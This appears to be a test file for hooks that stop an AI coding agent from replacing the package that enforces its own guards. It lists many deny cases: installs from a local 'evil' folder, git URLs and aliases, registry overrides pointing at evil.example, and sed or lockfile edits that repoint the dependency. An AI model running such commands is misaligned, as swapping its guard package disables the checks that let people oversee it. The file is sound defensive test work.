import { afterAll, describe, expect, test } from 'bun:test';
import { join } from 'node:path';
import { spawnSyncBounded } from '@venizia/dev-configs/testing';
import { OutsideGuard } from '../../hooks/index.ts';
import { PackageSwap } from '../../hooks/package-swap.ts';
import { toolEvent } from '../hook-event.helper.ts';
import { createProject, removeProjects } from '../project.helper.ts';

afterAll(removeProjects);

const PACKAGE_JSON = `{
  "name": "app",
  "dependencies": { "@venizia/vulcan": "^0.4.10", "left-pad": "1.0.0" },
  "workspaces": ["libs/ok"],
  "overrides": { "x": "1.0.0" }
}
`;

const root = createProject({
  files: {
    'package.json': PACKAGE_JSON,
    'evil/package.json': '{"name":"@venizia/vulcan"}',
    'other/package.json': '{"name":"left-pad"}',
    'libs/guards/package.json': '{"name":"@venizia/vulcan"}',
    'libs/ok/package.json': '{"name":"ok"}',
    'bunfig.toml': '[install]\nregistry = "https://registry.npmjs.org"\nexact = true\n',
    'bun.lock':
      '{\n  "packages": {\n    "@venizia/vulcan": ["@venizia/vulcan@0.4.10", "", {}],\n    "left-pad": ["left-pad@1.0.0", "", {}]\n  }\n}\n',
  },
});

const decisionsOf = (command: string): string[] =>
  PackageSwap.inspectCommand({ command, cwd: root }).map((hit) => hit.decision);

describe('a package manager that takes the guard package from somewhere else is refused', () => {
  test.each([
    'bun add @venizia/vulcan@file:./evil',
    'bun add ./evil',
    'bun add file:./evil',
    'bun add link:./evil',
    'bun add ./missing',
    'bun add @venizia/vulcan@npm:evil@1',
    'bun add @venizia/vulcan@git+https://x.example/a.git',
    'bun add @venizia/vulcan@github:u/r',
    'bun add @venizia/vulcan@https://x.example/a.tgz',
    'bun link @venizia/vulcan',
    'bun patch @venizia/vulcan',
    'bun patch @venizia/vulcan@0.4.10',
    'bun patch node_modules/@venizia/vulcan',
    'bun patch --commit node_modules/@venizia/vulcan',
    'bun patch --commit node_modules/.bun/@venizia+vulcan@1/node_modules/@venizia/vulcan',
    'bun --cwd other add ./evil',
    'npm install ./evil',
    'npm i @venizia/vulcan@file:./evil',
    'npm install ../evil',
    'npm link @venizia/vulcan',
    'npm link ./evil',
    'pnpm add ./evil',
    'pnpm add @venizia/vulcan@link:./evil',
    'pnpm patch @venizia/vulcan',
    'pnpm patch-commit ./evil',
    'yarn add ./evil',
    'yarn add @venizia/vulcan@portal:./evil',
    'yarn link ./evil',
    'taskset -c 0 bun add ./evil',
    'cd other && bun add ../evil',
    'sudo bun add ./evil',
    "su -c 'bun add ./evil'",
    'npm pkg set dependencies.@venizia/vulcan=file:./evil',
    'npm pkg set overrides.x=1',
    'bun pm pkg set workspaces[0]=evil',
  ])('%s is denied', (command) => {
    expect(decisionsOf(command)).toContain('deny');
  });

  test.each([
    'bun add --registry https://evil.example left-pad',
    'bun install --registry=https://evil.example',
    'bun add --cache-dir /tmp/c left-pad',
    'npm install --registry https://evil.example',
    'BUN_CONFIG_REGISTRY=https://evil.example bun install',
    'npm_config_registry=https://evil.example npm install',
    'NPM_CONFIG_REGISTRY=https://evil.example pnpm install',
  ])('%s is denied: the source of the install is set on the line', (command) => {
    expect(decisionsOf(command)).toContain('deny');
  });

  test.each([
    'bun add github:user/repo',
    'bun add user/repo',
    'bun add https://x.example/a.tgz',
    'bun add ../x.tgz',
    'bun add git+https://x.example/a.git',
    'npm install github:user/repo',
  ])('%s asks: the name of what it installs cannot be told', (command) => {
    expect(decisionsOf(command)).toEqual(['ask']);
  });

  test.each([
    'bun add @venizia/vulcan@^0.5.0',
    'bun add @venizia/vulcan@next',
    'bun add @venizia/vulcan@0.5.0-0',
    'bun add @venizia/vulcan',
    'bun add -d typescript',
    'bun add left-pad@1.0.1',
    'bun add ./other',
    'bun install',
    'bun install --frozen-lockfile',
    'bun i',
    'bun remove left-pad',
    'bun update',
    'bun link',
    'bun link left-pad',
    'bun patch left-pad',
    'npm install',
    'npm install @venizia/vulcan@^0.5.0',
    'npm ci',
    'pnpm install',
    'pnpm add left-pad',
    'yarn',
    'yarn add left-pad',
    'npm pkg set name=x',
    'bun run build',
    'bunx @venizia/vulcan --version',
    'bun node_modules/.bin/vulcan sync',
  ])('%s passes', (command) => {
    expect(decisionsOf(command)).toEqual([]);
  });

  test.each([
    'sed -i \'s#"@venizia/vulcan": ".*"#"@venizia/vulcan": "file:./evil"#\' package.json',
    "sed -i 's/registry/x/' bunfig.toml",
    "sed -i 's/workspaces/x/' package.json",
    "perl -pi -e 's/@venizia/x/' package.json",
  ])('%s is denied: a script that edits what pins the guard package', (command) => {
    expect(decisionsOf(command)).toContain('deny');
  });

  test.each([
    'sed -i s/1.0.0/1.0.1/ package.json',
    'sed -i s/vulcan/x/ package.json',
    'sed -i s/a/b/ README.md',
    'cat package.json',
    'jq .x package.json',
    'jq .x package.json > out.json',
    'cp package.json backup.json',
  ])('%s passes', (command) => {
    expect(decisionsOf(command)).toEqual([]);
  });

  test.each([
    'echo x > package.json',
    'tee package.json',
    'cp evil/package.json package.json',
    'mv tmp.json package.json',
    'echo x > bunfig.toml',
    'echo x > bun.lock',
    'echo x > libs/ok/package.json',
    'jq .x package.json > tmp.json && mv tmp.json package.json',
  ])('%s asks: the whole file is written', (command) => {
    expect(decisionsOf(command)).toContain('ask');
  });
});

describe('a file tool that changes where the guard package comes from is refused', () => {
  const judged = (opts: {
    file: string;
    content?: string;
    edits?: { oldString: string; newString: string }[];
  }): boolean =>
    OutsideGuard.inspect({
      input: {
        tool: opts.edits === undefined ? 'Write' : 'Edit',
        filePath: join(root, opts.file),
        command: undefined,
        cwd: root,
        content: opts.content,
        edits: opts.edits,
      },
      projectRoot: root,
      env: { HOME: '/nonexistent-home' },
    }).some((hit) => hit.isProtected === true);
  const edit = (oldString: string, newString: string) => ({
    file: 'package.json',
    edits: [{ oldString, newString }],
  });

  test.each([
    ['the spec to file:', edit('^0.4.10', 'file:./evil')],
    ['the spec to link:', edit('^0.4.10', 'link:../x')],
    ['the spec to workspace:', edit('^0.4.10', 'workspace:*')],
    ['the spec to an alias', edit('^0.4.10', 'npm:evil@1')],
    ['the spec to a git URL', edit('^0.4.10', 'git+https://x.example/y.git')],
    ['the spec to a URL', edit('^0.4.10', 'https://x.example/y.tgz')],
    ['an override of the package', edit('"x": "1.0.0"', '"@venizia/vulcan": "file:./evil"')],
    ['a nested override', edit('"x": "1.0.0"', '"x": { "@venizia/vulcan": "file:./evil" }')],
    [
      'a patch of the package',
      edit(
        '"overrides"',
        '"patchedDependencies": { "@venizia/vulcan@0.4.10": "patches/x.patch" }, "overrides"',
      ),
    ],
    [
      'a resolution of the package',
      edit('"overrides"', '"resolutions": { "@venizia/vulcan": "file:./evil" }, "overrides"'),
    ],
    [
      'a workspace that holds a package of that name',
      edit('"libs/ok"', '"libs/ok", "libs/guards"'),
    ],
    ['a workspace pattern that finds one', edit('"libs/ok"', '"libs/*"')],
    [
      'Write of the whole file with the spec changed',
      { file: 'package.json', content: PACKAGE_JSON.replace('^0.4.10', 'file:./evil') },
    ],
    [
      'a registry set for the scope in bunfig.toml',
      {
        file: 'bunfig.toml',
        content:
          '[install]\nregistry = "https://registry.npmjs.org"\nexact = true\n[install.scopes]\n"@venizia" = "https://evil.example"\n',
      },
    ],
    [
      'the registry changed in bunfig.toml',
      {
        file: 'bunfig.toml',
        content: '[install]\nregistry = "https://evil.example"\nexact = true\n',
      },
    ],
    [
      'the lockfile line of the package',
      {
        file: 'bun.lock',
        edits: [{ oldString: '@venizia/vulcan@0.4.10', newString: '@venizia/vulcan@file:evil' }],
      },
    ],
  ])('%s is denied', (_name, call) => {
    expect(judged(call)).toBe(true);
  });

  test.each([
    ['Write of the same file', { file: 'package.json', content: PACKAGE_JSON }],
    ['another dependency added', edit('"left-pad": "1.0.0"', '"left-pad": "1.0.0", "other": "^2"')],
    ['the spec moved to another registry version', edit('^0.4.10', '^0.5.0')],
    ['the spec moved to a tag', edit('^0.4.10', 'next')],
    ['an unrelated override', edit('"x": "1.0.0"', '"y": "2.0.0"')],
    ['a workspace with another package', edit('"libs/ok"', '"libs/ok", "other"')],
    ['a script added', edit('"name": "app",', '"name": "app", "scripts": { "x": "y" },')],
    [
      'a line of bunfig.toml that moves nothing',
      {
        file: 'bunfig.toml',
        content: '[install]\nregistry = "https://registry.npmjs.org"\nexact = false\n',
      },
    ],
    [
      'another line of the lockfile',
      {
        file: 'bun.lock',
        edits: [{ oldString: 'left-pad@1.0.0', newString: 'left-pad@1.0.1' }],
      },
    ],
    ['a file that is not one of them', { file: 'README.md', content: 'x' }],
    [
      'the package.json of a workspace member',
      { file: 'libs/ok/package.json', content: '{"name":"ok","dependencies":{"left-pad":"1"}}' },
    ],
  ])('%s passes', (_name, call) => {
    expect(judged(call)).toBe(false);
  });
});

describe('the hooks refuse the attack that was proven', () => {
  const HOOKS = join(import.meta.dir, '..', '..', '..', 'base', 'hooks');
  const run = (opts: { hook: string; stdin: string }) =>
    spawnSyncBounded({
      cmd: [process.execPath, join(HOOKS, opts.hook)],
      cwd: root,
      env: { ...process.env, CLAUDE_PROJECT_DIR: root },
      stdin: new Blob([opts.stdin]),
      stdout: 'pipe',
      stderr: 'pipe',
    }).stdout.toString();

  test('bun add of the package from a folder: guard-git denies it', () => {
    for (const command of ['bun add @venizia/vulcan@file:./evil', 'bun add ./evil']) {
      const answer = run({
        hook: 'guard-git.ts',
        stdin: toolEvent({ tool: 'Bash', input: { command }, cwd: root }),
      });

      expect(answer, command).toContain('"permissionDecision":"deny"');
      expect(answer, command).toContain('V-S-05');
    }
  });

  test('an Edit that points the dependency at a folder: guard-outside denies it', () => {
    const answer = run({
      hook: 'guard-outside.ts',
      stdin: toolEvent({
        tool: 'Edit',
        input: Object.fromEntries([
          ['file_path', join(root, 'package.json')],
          ['old_string', '^0.4.10'],
          ['new_string', 'file:./evil'],
        ]),
        cwd: root,
      }),
    });

    expect(answer).toContain('"permissionDecision":"deny"');
    expect(answer).toContain('takes the guard package from');
  });

  test('a MultiEdit and a Write are read the same way', () => {
    const multi = run({
      hook: 'guard-outside.ts',
      stdin: toolEvent({
        tool: 'MultiEdit',
        input: Object.fromEntries([
          ['file_path', join(root, 'package.json')],
          [
            'edits',
            [
              Object.fromEntries([
                ['old_string', '"x": "1.0.0"'],
                ['new_string', '"@venizia/vulcan": "file:./evil"'],
              ]),
            ],
          ],
        ]),
        cwd: root,
      }),
    });
    const written = run({
      hook: 'guard-outside.ts',
      stdin: toolEvent({
        tool: 'Write',
        input: Object.fromEntries([
          ['file_path', join(root, 'package.json')],
          ['content', PACKAGE_JSON.replace('^0.4.10', 'link:../x')],
        ]),
        cwd: root,
      }),
    });

    expect(multi).toContain('"permissionDecision":"deny"');
    expect(written).toContain('"permissionDecision":"deny"');
  });

  test('an ordinary edit of package.json passes', () => {
    const answer = run({
      hook: 'guard-outside.ts',
      stdin: toolEvent({
        tool: 'Edit',
        input: Object.fromEntries([
          ['file_path', join(root, 'package.json')],
          ['old_string', '"left-pad": "1.0.0"'],
          ['new_string', '"left-pad": "1.0.1"'],
        ]),
        cwd: root,
      }),
    });

    expect(answer.trim()).toBe('');
  });
});
